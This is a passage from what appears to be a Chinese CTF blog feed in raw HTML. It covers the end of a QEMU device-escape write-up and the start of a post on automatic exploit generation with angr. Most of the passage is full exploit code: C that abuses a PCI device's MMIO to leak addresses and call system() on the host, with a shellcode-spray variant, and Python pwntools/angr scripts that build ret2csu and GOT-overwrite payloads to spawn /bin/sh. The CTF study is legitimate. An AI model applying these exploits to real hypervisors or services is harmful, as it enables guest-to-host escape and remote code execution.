class="hljs-title function_">main</span><span class="hljs-params">()</span>&#123;<br>    <span class="hljs-type">void</span> *buf;<br>    <span class="hljs-type">uint64_t</span> ptr_addr;<br>    <span class="hljs-type">int</span>  mmio_fd = open(<span class="hljs-string">&quot;/sys/devices/pci0000:00/0000:00:04.0/resource0&quot;</span>, O_RDWR | O_SYNC);<br>    mmio         = mmap(<span class="hljs-number">0</span>, <span class="hljs-number">0x1000</span>, PROT_READ | PROT_WRITE, MAP_SHARED, mmio_fd, <span class="hljs-number">0</span>);<br><br>    system(<span class="hljs-string">&quot;sysctl vm.nr_hugepages=30&quot;</span>);<br>    <span class="hljs-keyword">while</span> (<span class="hljs-number">1</span>)<br>    &#123;<br>        buf = mmap(<span class="hljs-number">0</span>, <span class="hljs-number">0x100000</span>, PROT_READ | PROT_WRITE, MAP_SHARED | MAP_ANONYMOUS | <span class="hljs-number">0x40000</span>, <span class="hljs-number">-1</span>, <span class="hljs-number">0</span>);<br>        <span class="hljs-built_in">memset</span>(buf, <span class="hljs-string">&#x27;\x90&#x27;</span>, <span class="hljs-number">0x1000</span>);<br>        ptr_addr = gva_to_gpa(buf);<br>        <span class="hljs-keyword">if</span>(ptr_addr != <span class="hljs-number">0</span> &amp;&amp; (ptr_addr &amp; <span class="hljs-number">0xfffff</span>) == <span class="hljs-number">0</span>)&#123;<br>            <span class="hljs-keyword">break</span>;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">1</span>; i &lt; <span class="hljs-number">0x100</span>; ++i)&#123;<br>            <span class="hljs-built_in">memset</span>(buf + i * <span class="hljs-number">0x1000</span>, <span class="hljs-string">&#x27;\x90&#x27;</span>, <span class="hljs-number">0x1000</span>);<br>    &#125;<br>    <br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">0x100</span>; ++i)&#123;<br>        <span class="hljs-built_in">memcpy</span>(buf + <span class="hljs-number">0x400</span> + i * <span class="hljs-number">0x1000</span>, shellcode, <span class="hljs-keyword">sizeof</span>(shellcode));<br>    &#125;<br>    <br>    do_write(<span class="hljs-number">0xffffffffba5185f0</span>, <span class="hljs-number">0x100000</span>, ptr_addr);<br>&#125;<br></code></pre></td></tr></table></figure><p> 最后弹出计算器：</p><img src="/img/19/Screenshot 2023-09-25 190239.png" style="zoom: 67%;" /><p>​                                                                                                                                </p><p>后来发现还有其它方法，去修改MemoryRegion中的opaque，但是也要爆破一字节，具体参考：<a href="https://mp.weixin.qq.com/s/fkiFV7u3QjDsfHDcdwl6iA">https://mp.weixin.qq.com/s/fkiFV7u3QjDsfHDcdwl6iA</a></p><p>最后修改MemoryRegion结构体如下：</p><img src="/img/19/Screenshot 2023-09-26 004411.png" style="zoom: 50%;" /><p>​                                            </p><p>exp</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">define</span> _GNU_SOURCE</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdint.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;fcntl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;assert.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;inttypes.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;fcntl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/mman.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/io.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PAGE_SHIFT  12</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PAGE_SIZE   (1 &lt;&lt; PAGE_SHIFT)</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PFN_PRESENT (1ull &lt;&lt; 63)</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PFN_PFN     ((1ull &lt;&lt; 55) - 1)</span><br><br><span class="hljs-type">void</span> * mmio;<br><br><span class="hljs-type">uint32_t</span> <span class="hljs-title function_">page_offset</span><span class="hljs-params">(<span class="hljs-type">uint32_t</span> addr)</span><br>&#123;<br>    <span class="hljs-comment">// addr &amp; 0xfff</span><br>    <span class="hljs-keyword">return</span> addr &amp; ((<span class="hljs-number">1</span> &lt;&lt; PAGE_SHIFT) - <span class="hljs-number">1</span>);<br>&#125;<br><br><span class="hljs-type">uint64_t</span> <span class="hljs-title function_">gva_to_gfn</span><span class="hljs-params">(<span class="hljs-type">void</span> *addr)</span><br>&#123;<br>    <span class="hljs-type">uint64_t</span> pme, gfn;<br>    <span class="hljs-type">size_t</span> offset;<br>    <span class="hljs-type">int</span> fd = open(<span class="hljs-string">&quot;/proc/self/pagemap&quot;</span>, O_RDONLY);<br>    <span class="hljs-keyword">if</span> (fd &lt; <span class="hljs-number">0</span>) &#123;<br>        perror(<span class="hljs-string">&quot;open&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);<br>    &#125;<br>    <span class="hljs-comment">//printf(&quot;pfn_item_offset : %p\n&quot;, (uintptr_t)addr &gt;&gt; 9);</span><br>    offset = ((<span class="hljs-type">uintptr_t</span>)addr &gt;&gt; <span class="hljs-number">9</span>) &amp; ~<span class="hljs-number">7</span>;<br>    lseek(fd, offset, SEEK_SET);<br>    read(fd, &amp;pme, <span class="hljs-number">8</span>);<br>    <span class="hljs-keyword">if</span> (!(pme &amp; PFN_PRESENT))<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br><br>    gfn = pme &amp; PFN_PFN;<br>    <span class="hljs-keyword">return</span> gfn;<br>&#125;<br><br><span class="hljs-type">uint64_t</span> <span class="hljs-title function_">gva_to_gpa</span><span class="hljs-params">(<span class="hljs-type">void</span> *addr)</span><br>&#123;<br>    <span class="hljs-type">uint64_t</span> gfn = gva_to_gfn(addr);<br>    assert(gfn != <span class="hljs-number">-1</span>);<br>    <span class="hljs-keyword">return</span> (gfn &lt;&lt; PAGE_SHIFT) | page_offset((<span class="hljs-type">uint64_t</span>)addr);<br>&#125;<br><br><br><span class="hljs-type">void</span> <span class="hljs-title function_">mmio_write</span><span class="hljs-params">(<span class="hljs-type">uint64_t</span> addr, <span class="hljs-type">uint64_t</span> val)</span>&#123;<br>    *(<span class="hljs-type">uint64_t</span>*)(mmio + addr) = val;<br>&#125;<br><br><span class="hljs-type">uint64_t</span> <span class="hljs-title function_">mmio_read</span><span class="hljs-params">(<span class="hljs-type">uint64_t</span> addr)</span>&#123; <br>    <span class="hljs-keyword">return</span> *(<span class="hljs-type">uint64_t</span> *)(mmio + addr); <br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">do_write</span><span class="hljs-params">(<span class="hljs-type">size_t</span> offset, <span class="hljs-type">size_t</span> size, <span class="hljs-type">size_t</span> addr)</span>&#123;<br>    mmio_write(<span class="hljs-number">8</span>, offset);<br>    mmio_write(<span class="hljs-number">0x10</span>, size);<br>    mmio_write(<span class="hljs-number">0x18</span>, addr);<br>    mmio_write(<span class="hljs-number">0x20</span>, <span class="hljs-number">0xF62D</span>);<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span>&#123;<br>    <span class="hljs-type">void</span> *buf;<br>    <span class="hljs-type">uint64_t</span> ptr_addr;<br>    <span class="hljs-type">int</span>  mmio_fd = open(<span class="hljs-string">&quot;/sys/devices/pci0000:00/0000:00:04.0/resource0&quot;</span>, O_RDWR | O_SYNC);<br>    mmio         = mmap(<span class="hljs-number">0</span>, <span class="hljs-number">0x1000</span>, PROT_READ | PROT_WRITE, MAP_SHARED, mmio_fd, <span class="hljs-number">0</span>);<br>    <br>    buf = mmap(<span class="hljs-number">0</span>, <span class="hljs-number">0x1000</span>, PROT_READ | PROT_WRITE, MAP_SHARED | MAP_ANONYMOUS, <span class="hljs-number">-1</span>, <span class="hljs-number">0</span>);<br>    *(<span class="hljs-type">uint16_t</span>*)buf = <span class="hljs-number">0xf010</span> - <span class="hljs-number">0xb8</span>;<br><br>    ptr_addr = gva_to_gpa(buf);<br>    do_write(<span class="hljs-number">0xffffffffffffff40</span>, <span class="hljs-number">2</span>, ptr_addr);<br><br>    <span class="hljs-type">uint64_t</span> heap_addr = mmio_read(<span class="hljs-number">8</span>);<br>    <span class="hljs-type">uint64_t</span> leak_elf_addr = mmio_read(<span class="hljs-number">0x10</span>);<br>    <span class="hljs-type">uint64_t</span> elf_base = leak_elf_addr - <span class="hljs-number">0xd62d20</span>;<br>    <span class="hljs-type">uint64_t</span> system_plt = elf_base + <span class="hljs-number">0x2C2180</span>;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[*] leak_heap_addr_is %#lx\n&quot;</span>, heap_addr);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot; [*] leak_elf_base_addr_is %#lx\n&quot;</span>, elf_base);<br><br>    <span class="hljs-type">char</span> cmd[<span class="hljs-number">0x20</span>] = <span class="hljs-string">&quot;gnome-calculator&quot;</span>;<br>    mmio_write(<span class="hljs-number">0x18</span>, heap_addr + <span class="hljs-number">0x20</span>);<br>    *(<span class="hljs-type">uint64_t</span>*)buf = heap_addr + <span class="hljs-number">0x8f0</span> + <span class="hljs-number">0x58</span>;<br>    *(<span class="hljs-type">uint64_t</span>*)(buf + <span class="hljs-number">8</span>) = heap_addr + <span class="hljs-number">0x8f0</span> + <span class="hljs-number">0x60</span>;<br>    *(<span class="hljs-type">uint64_t</span>*)(buf + <span class="hljs-number">0x10</span>) = system_plt;<br>    <span class="hljs-built_in">memcpy</span>(buf + <span class="hljs-number">0x18</span>, cmd, <span class="hljs-keyword">sizeof</span>(cmd));<br><br>    do_write(<span class="hljs-number">0xffffffffffffff18</span>, <span class="hljs-number">0x30</span>, ptr_addr);<br>    mmio_read(<span class="hljs-number">0</span>);<br><br>&#125;<br></code></pre></td></tr></table></figure><h3 id="miniobs"><a href="#miniobs" class="headerlink" title="miniobs"></a>miniobs</h3>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>auto pwn</title>
    <link href="/2023/09/20/auto-pwn/"/>
    <url>/2023/09/20/auto-pwn/</url>
    
    <content type="html"><![CDATA[<p>本文已在看雪上发表：<a href="https://bbs.kanxue.com/thread-278971.htm">https://bbs.kanxue.com/thread-278971.htm</a></p><p>​                                                       </p><p>这类利用angr去自动探测漏洞的题在很早以前就看到过，但是在CTF中不会直接给附件，而是nc连上后接收一段base64编码，再将其解码为二进制文件，每次得到的二进制文件并不是完全相同；如果不给出完整的docker文件（拥有几个接收到二进制文件也行），不然本地是很难复现的。</p><p>这里找的是三个拥有完整docker文件的题和一个可以提供两个二进制文件的题：</p><p><a href="https://github.com/huaweictf/xctf_huaweicloud-qualifier-2020/tree/main/pwn/game_pwn">https://github.com/huaweictf/xctf_huaweicloud-qualifier-2020/tree/main/pwn/game_pwn</a></p><p><a href="https://github.com/P4nda0s/CheckIn_ret2text">https://github.com/P4nda0s/CheckIn_ret2text</a></p><p><a href="https://github.com/utisss/UTCTF-22/tree/33b6bae1338ddabc6c795387051a544cee8e1a16/pwn/pwn-aeg2">https://github.com/utisss/UTCTF-22/tree/33b6bae1338ddabc6c795387051a544cee8e1a16/pwn/pwn-aeg2</a></p><p><a href="https://github.com/cscosu/ctf-writeups/tree/8d7885461c734a3035cacc7e739c90c1bc7910a3/2021/utctf/AEG">https://github.com/cscosu/ctf-writeups/tree/8d7885461c734a3035cacc7e739c90c1bc7910a3/2021/utctf/AEG</a></p><p>​                                                         </p><h3 id="game-pwn"><a href="#game-pwn" class="headerlink" title="game_pwn"></a>game_pwn</h3><p>题目一开始就直接发送base64编码，然后让我们输入一段数据，这里还不知道这串数据是什么，并且一段时间后就会关闭：</p><img src="/img/18/Screenshot 2023-09-21 123856.png" style="zoom:80%;" /><p>​                                    </p><p>解码得到二进制文件后直接使用ida分析，主函数中将程序接收到的第一个参数转化为整数后作为sub_4006F9函数的的参数：</p><img src="/img/18/Screenshot 2023-09-21 145019.png" style="zoom:80%;" /><p>​                                      </p><p>sub_4006F9函数中利用这个参数去通过一系列判断，如果满足这些约束就可以执行read函数去栈溢出：</p><img src="/img/18/Screenshot 2023-09-21 145150.png" style="zoom:80%;" /><p>​                              </p><p>继续接收多个文件，发现每个文件中sub_4006F9函数中的约束条件都是不同的；我们每次去分析这些约束肯定会浪费大量时间，在题目拥有时间限制的情况下完全不合适，这里就要用到angr去自动判断约束条件。</p><p>angr的用法可以直接参考这些文档：<a href="https://docs.angr.io/en/latest/">https://docs.angr.io/en/latest/</a>   、   <a href="https://xz.aliyun.com/t/7117">https://xz.aliyun.com/t/7117</a></p><p>最好先去拿angr ctf先去练手，加深理解：<a href="https://github.com/jakespringer/angr_ctf">https://github.com/jakespringer/angr_ctf</a>    、 <a href="https://arttnba3.cn/2022/11/24/ANGR-0X00-ANGR_CTF/">https://arttnba3.cn/2022/11/24/ANGR-0X00-ANGR_CTF/</a></p><p>需要判断约束的只有sub_4006F9函数，直接将其作为初始状态，而目标地址在read函数处，将rdi作为需要求解对象，很容易写出自动求解的脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> angr<br><span class="hljs-keyword">import</span> claripy<br>binary_name = <span class="hljs-string">&quot;a&quot;</span><br>proj = angr.Project(binary_name)<br>start_addr = <span class="hljs-number">0x4006F9</span><br>init_state = proj.factory.blank_state(addr = start_addr)<br>num_bvs = claripy.BVS(<span class="hljs-string">&#x27;num&#x27;</span>, <span class="hljs-number">4</span> * <span class="hljs-number">8</span>)<br>init_state.regs.rdi = num_bvs<br>simgr = proj.factory.simgr(init_state)<br>simgr.explore(find = find_addr)<br><span class="hljs-keyword">if</span> simgr.found:<br>    solution_state = simgr.found[<span class="hljs-number">0</span>]<br>    num = solution_state.solver.<span class="hljs-built_in">eval</span>(num_bvs, cast_to=<span class="hljs-built_in">int</span>)<br><span class="hljs-keyword">else</span> :<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Could not find the solution&#x27;</span>)<br></code></pre></td></tr></table></figure><p>在不同的二进制文件中，除了start_addr相同，目标地址是不同的，并且没有符号表，只能通过特定的汇编机器码找到对应的地址。官方的wp是使用objdump命令去找，这里我直接使用pwntools去搜索，更加方便。</p><p>得到通过约束条件的整数后，可以知道最开始的输入就是这个整数，然后继续输入栈溢出；栈溢出后去ret2csu继续调用read函数去修改read函数got表的最后一字节，修改为指向syscall指令的地址，再调用atoi将rax赋值为0x3b，最后调用read函数，这时read函数got指向syscall指令，可以执行系统调用去getshell。</p><p>​</p><p>完整exp：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> angr<br><span class="hljs-keyword">import</span> claripy<br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*<br><span class="hljs-keyword">import</span> base64<br><br>p = remote(<span class="hljs-string">&#x27;127.0.0.1&#x27;</span>, <span class="hljs-number">9999</span>)<br>p.recvline()<br>p.recvline()<br>bin_data = base64.b64decode(p.recvline().decode())<br><span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;b&quot;</span>, <span class="hljs-string">&quot;wb&quot;</span>).write(bin_data)<br>binary_name = <span class="hljs-string">&quot;b&quot;</span><br><span class="hljs-comment">#使用pwntools搜索指令得到相应的地址</span><br>elf = ELF(binary_name, checksec=<span class="hljs-literal">False</span>)<br>context.arch = <span class="hljs-string">&#x27;amd64&#x27;</span><br><span class="hljs-comment">#context.log_level = &#x27;debug&#x27;</span><br>find_addr = elf.search(asm(<span class="hljs-string">&#x27;mov rsi, rax&#x27;</span>)).__next__() + <span class="hljs-number">3</span><br>avoid_addr = find_addr + <span class="hljs-number">0x1b</span><br>avoid_addr1 = find_addr + <span class="hljs-number">0x11</span><br>csu_addr1 = elf.search(asm(<span class="hljs-string">&#x27;add rsp, 8;pop rbx&#x27;</span>)).__next__() + <span class="hljs-number">4</span><br>csu_addr2 = csu_addr1 - <span class="hljs-number">0x1a</span><br>pop_rdi_ret = csu_addr1 + <span class="hljs-number">9</span><br>pop_rsi_r15_ret = csu_addr1 + <span class="hljs-number">7</span><br><br><span class="hljs-comment">#使用angr得到通过约束的整数</span><br>proj = angr.Project(binary_name)<br>start_addr = <span class="hljs-number">0x4006F9</span><br>init_state = proj.factory.blank_state(addr = start_addr)<br>num_bvs = claripy.BVS(<span class="hljs-string">&#x27;num&#x27;</span>, <span class="hljs-number">4</span> * <span class="hljs-number">8</span>)<br>init_state.regs.rdi = num_bvs<br><span class="hljs-comment"># def fail(state):</span><br><span class="hljs-comment">#     if state.addr &lt;= avoid_addr and state.addr &gt;= avoid_addr1:</span><br><span class="hljs-comment">#         return True</span><br><span class="hljs-comment">#     else:</span><br><span class="hljs-comment">#         return False</span><br>num = <span class="hljs-number">0</span><br>oversize = <span class="hljs-number">0</span><br>simgr = proj.factory.simgr(init_state)<br>simgr.explore(find = find_addr, avoid = avoid_addr)<br><span class="hljs-keyword">if</span> simgr.found:<br>    solution_state = simgr.found[<span class="hljs-number">0</span>]<br>    num = solution_state.solver.<span class="hljs-built_in">eval</span>(num_bvs, cast_to=<span class="hljs-built_in">int</span>)<br>    oversize = solution_state.solver.<span class="hljs-built_in">eval</span>(solution_state.regs.rbp) - solution_state.solver.<span class="hljs-built_in">eval</span>(solution_state.regs.rsi) <span class="hljs-comment">#不同二进制文件的溢出大小不同，这里计算得到溢出大小</span><br><span class="hljs-keyword">else</span> :<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Could not find the solution&#x27;</span>)<br>    exit()<br><br>p.sendlineafter(<span class="hljs-string">b&#x27;:&#x27;</span>, <span class="hljs-built_in">str</span>(num).encode())<br><span class="hljs-comment">#栈溢出getshell</span><br><span class="hljs-comment"># start_process = &#x27;./&#x27; + binary_name + &#x27; &#x27; + str(num)</span><br><span class="hljs-comment"># p = process(start_process.split())</span><br><span class="hljs-comment"># gdb.attach(p, &quot;b *&quot; + str(find_addr + 10))</span><br><span class="hljs-comment"># pause()</span><br>payload = <span class="hljs-string">b&#x27;a&#x27;</span> * oversize + p64(<span class="hljs-number">0</span>) + p64(csu_addr1)<br>payload += p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">1</span>) + p64(elf.got[<span class="hljs-string">&#x27;read&#x27;</span>]) + p64(<span class="hljs-number">0x11</span>) + p64(<span class="hljs-number">0x601010</span>) + p64(<span class="hljs-number">0</span>) + p64(csu_addr2)<br>payload += p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">1</span>) + p64(elf.got[<span class="hljs-string">&#x27;atoi&#x27;</span>]) + p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0x601010</span>) + p64(csu_addr2)<br>payload += p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">1</span>) + p64(elf.got[<span class="hljs-string">&#x27;read&#x27;</span>]) + p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0x601018</span>) + p64(csu_addr2)<br>p.send(payload)<br>sleep(<span class="hljs-number">0.5</span>)<br>payload = <span class="hljs-string">b&#x27;59&#x27;</span> + <span class="hljs-string">b&#x27;\x00&#x27;</span> * <span class="hljs-number">6</span> + <span class="hljs-string">b&#x27;/bin/sh\x00&#x27;</span> + <span class="hljs-string">b&#x27;\x5e&#x27;</span><br>p.send(payload)<br>p.sendline(<span class="hljs-string">b&quot;cat flag&quot;</span>)<br>flag = p.recvline()<br><span class="hljs-built_in">print</span>(flag)<br><span class="hljs-comment">#p.interactive()</span><br></code></pre></td></tr></table></figure><h3 id="CheckIn-ret2text"><a href="#CheckIn-ret2text" class="headerlink" title="CheckIn_ret2text"></a>CheckIn_ret2text</h3><p>这题连上后需要爆破前四位数据与sha256加密后的数据对比，通过这个判断后可以得到二进制文件base64编码：</p><img src="/img/18/Screenshot 2023-09-21 124024.png" style="zoom:100%;" /><p>​                                        </p><p>题目的主函数就是一堆判断，input_val函数是输入的数字，input_line函数是输入的字符串，fksth函数是比较字符串，题目给了后门函数，没有canary，很容易想到栈溢出后去调用backdoor函数：</p><img src="/img/18/Screenshot 2023-09-21 160227.png" style="zoom:100%;" /><p>​                                 </p><p>造成溢出的输入函数肯定是input_line，第一个参数是写入地址，第二个参数是大小；主函数中有大量的input_line函数调用，而且第二个参数普遍不大，开始就直接找到靠近栈底的变量，找到其引用的input_line：</p><img src="/img/18/Screenshot 2023-09-21 160620.png" style="zoom: 80%;" /><p>​                                  </p><p>果然可以找到栈溢出：</p><img src="/img/18/Screenshot 2023-09-21 160701.png" style="zoom:80%;" /><p>​                                                                   </p><p>不同的二进制文件中fksth函数比较的字符串是不同的，判断的数字也是不同的，这里依然是使用angr去求解约束。</p><p>出题人的wp已经很详细了，直接使用unconstrained state求解就得到一个完整的payload（这种方法tql）。自己复现时将<code>proj.factory.entry_state()</code>修改为指定main函数的地址，但是却得不到正确的payload，不知道是不是unconstrained state求解的影响。</p><p>最后自己也采用传统的方法——直接找到可以发生栈溢出的地址，改写了一下。</p><p>完整exp：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> base64<br><span class="hljs-keyword">import</span> hashlib<br><span class="hljs-keyword">import</span> random<br><span class="hljs-keyword">import</span> angr<br><span class="hljs-keyword">import</span> claripy<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">pass_proof</span>(<span class="hljs-params">salt, <span class="hljs-built_in">hash</span></span>):<br>    <span class="hljs-built_in">dir</span> = string.ascii_letters + string.digits<br>    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>        rand_str = (<span class="hljs-string">&#x27;&#x27;</span>.join([random.choice(<span class="hljs-built_in">dir</span>) <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">4</span>)])).encode() + salt<br>        <span class="hljs-keyword">if</span> hashlib.sha256(rand_str).hexdigest() == <span class="hljs-built_in">hash</span>.decode() :<br>            <span 